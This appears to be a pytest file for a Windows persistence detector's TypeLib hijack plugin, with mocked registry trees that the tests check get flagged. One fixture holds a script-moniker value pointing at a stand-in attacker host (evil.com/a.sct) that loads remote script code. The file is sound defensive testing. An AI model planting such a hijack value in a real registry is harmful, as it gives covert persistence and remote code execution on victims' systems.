from __future__ import annotations

from typing import TYPE_CHECKING
from unittest.mock import MagicMock

from pyrsistencesniper.core.models import AccessLevel, UserProfile
from pyrsistencesniper.plugins.T1546.typelib_hijack import TypeLibHijack

from .conftest import make_node, make_plugin

if TYPE_CHECKING:
    from pathlib import Path


def test_script_moniker_flagged(tmp_path: Path) -> None:
    user = UserProfile(
        username="victim",
        profile_path=tmp_path / "Users" / "victim",
        ntuser_path=tmp_path / "ntuser.dat",
    )
    p = make_plugin(TypeLibHijack, tmp_path, user_profiles=[user])

    hive_mock = MagicMock()
    p.registry.open_hive.return_value = hive_mock

    plat_node = make_node(values={"(Default)": "script:http://evil.com/a.sct"})
    zero_node = make_node(children={"win32": plat_node})
    ver_node = make_node(children={"0": zero_node})
    guid_node = make_node(children={"1.0": ver_node})
    typelib_tree = make_node(children={"{evil-guid}": guid_node})
    p.registry.load_subtree.return_value = typelib_tree

    findings = p.run()
    assert len(findings) >= 1
    assert any("script:" in f.value for f in findings)
    assert all(f.access_gained == AccessLevel.USER for f in findings)


def test_unsafe_path_flagged(tmp_path: Path) -> None:
    user = UserProfile(
        username="victim",
        profile_path=tmp_path / "Users" / "victim",
        ntuser_path=tmp_path / "ntuser.dat",
    )
    p = make_plugin(TypeLibHijack, tmp_path, user_profiles=[user])

    hive_mock = MagicMock()
    p.registry.open_hive.return_value = hive_mock

    plat_node = make_node(values={"(Default)": r"C:\Users\victim\evil.tlb"})
    zero_node = make_node(children={"win64": plat_node})
    ver_node = make_node(children={"0": zero_node})
    guid_node = make_node(children={"2.0": ver_node})
    typelib_tree = make_node(children={"{other-guid}": guid_node})
    p.registry.load_subtree.return_value = typelib_tree

    findings = p.run()
    assert len(findings) >= 1


def test_no_users_returns_empty(tmp_path: Path) -> None:
    p = make_plugin(TypeLibHijack, tmp_path)
    assert p.run() == []
